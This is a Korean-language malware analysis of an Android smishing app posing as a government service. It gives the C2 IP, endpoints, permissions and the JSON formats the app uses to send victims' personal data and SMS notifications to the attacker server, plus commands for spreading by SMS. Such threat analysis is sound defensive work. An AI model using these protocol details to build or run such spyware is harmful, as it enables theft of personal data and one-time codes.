# SmartApp.apk
---
## 공격자 서버 정보
- 115.91.26[.]76

## path
- /updateUserNotes
- /updateUserLong
- /updateUserMsg
- /send_msg_error

---
## 앱 정보
패키지 명: `com.wgjsf.ttdbdlat`

Hash (SHA-256): `5d57ee3630b8ed2bdaf08b2318cdd116804efb7f76691a6c78461eec61a0a9f8`

## 앱 권한
```
android.permission.ACCESS_NETWORK_STATE
android.permission.SEND_SMS
android.permission.BIND_NOTIFICATION_LISTENER_SERVICE
android.permission.READ_PHONE_STATE
android.permission.READ_PHONE_NUMBERS
android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
android.permission.RECEIVE_BOOT_COMPLETED
android.permission.WAKE_LOCK
android.permission.FOREGROUND_SERVICE
```

```xml
<intent-filter>
    <action android:name="com.ManageGov"/> ...
</intent-filter>
```

## 진행 방식
- 앱 실행
- 권한 요청
- updateUserLong
- 백그라운드에서 알림 정보 읽기 시작
- 화면 표시
- 인적 사항 넣으면 정부 사이트로 이동 (updateUserNotes)

---

# updateUserNotes
사용자의 이름과 생년월일을 입력 받고 서버에 전송.

### REQUEST
**POST** http://115.91.26[.]76/updateUserNotes

```json
{
    "uuid": "생성된 uuid",
    "number": "전화번호",
    "operator": "통신사",
    "phone_type": "휴대폰 기기 종류",
    "android_v": "안드로이드 버전",
    "empower": {
        "phone": 1,         // android.permission.READ_PHONE_STATE and android.permission.READ_PHONE_NUMBERS
        "sms": 1,           // android.permission.SEND_SMS
        "contacts": 0,      // 0 고정
        "image": 0,         // 0 고정
        "network": 0,       // 0 고정
        "accessibility": 0, // 0 고정
        "msg": 1,           // ACTION_NOTIFICATION_LISTENER_SETTINGS
        "battery": 1        // android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    },
    "name": "사용자가 입력한 이름",
    "birth": "사용자가 입력한 생일"
}
```

### RESPONSE
```json
{
    "is_ok": 1,
    "value": "생성된 uuid",
    "key": "uuid",
    "re_url": "https:\/\/www.gov.kr\/portal\/main\/nologin"
}
```
re_url로 이동이 된다.

# updateUserLong
사용자의 정보를 서버에 전송하고 서버의 명령을 처리함. 

### REQUEST
**POST** http://115.91.26[.]76/updateUserLong

```json
{
    "uuid": "생성된 uuid",
    "number": "전화번호",
    "operator": "통신사",
    "phone_type": "휴대폰 기기 종류",
    "android_v": "안드로이드 버전",
    "empower": {
        "phone": 1,         // android.permission.READ_PHONE_STATE and android.permission.READ_PHONE_NUMBERS
        "sms": 1,           // android.permission.SEND_SMS
        "contacts": 0,      // 0 고정
        "image": 0,         // 0 고정
        "network": 0,       // 0 고정
        "accessibility": 0, // 0 고정
        "msg": 1,           // ACTION_NOTIFICATION_LISTENER_SETTINGS
        "battery": 1        // android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    }
}
```

### RESPONSE
```json
{
    "is_ok": 1,
    "is_muted": 0,
    "is_shake": 0,
    "isDeleteMsg": 0,
    "deleteMsgIdList": [],
    "is_connect_agora": {
        "isOpen": 0,
        "appId": "",
        "cret": "",
        "token": "",
        "uid": 0,
        "roomId": "",
        "camera_state": 2,
        "mike_state": 1
    },
    "ringtone_volume": 0,
    "is_delete_self": 0,
    "is_new_msg": 0,
    "delete_app_list": [],
    "phonelist": []
}
```

만약 `is_new_msg`가 1이면 감염된 폰이 2차 감염을 유도한다.
response에서 `description`이 문자 메시지가 되고 (현재는 안보임), `phonelist`가 메시지를 보낼 폰 번호의 목록이 된다.

# updateUserMsg
사용자의 알림 데이터를 서버로 보냄.

알림 데이터를 필터링 하는 과정은 다음과 같음. (문자 메시지를 타겟하는거로 추측)

### 채널 아이디에 1개 이상 포함되어야 하는 단어
- sms

### 패키지 이름에 1개 이상 포함되어야 하는 단어
- mms
- sms

### 패키지 이름이랑 일치해야하는 단어
- com.android.mms
- com.google.android.apps.messaging
- com.samsung.android.messaging
- com.android.messaging
- com.miui.message
- com.oneplus.mms
- com.htc.sense.mms
- com.sec.android.app.samsungapps

### REQUEST
**POST** http://115.91.26[.]76/updateUserMsg

```json
{
    "uuid": "생성된 uuid",
    "data": {
        "description": "알림 내용",
        "type": 1,
        "phone": "알림 제목",
        "send_time": "현재 시각 (ms)",
        "id": -1,
        "is_color": 0
    } // 이 데이터는 toString으로 문자열 객체로 보내짐.
}
```

### RESPONSE

```json
{
    "is_ok": 1
}
```

사용자의 알림 데이터를 서버로 보내고, updateUserLong로 다시 요청을 보냄.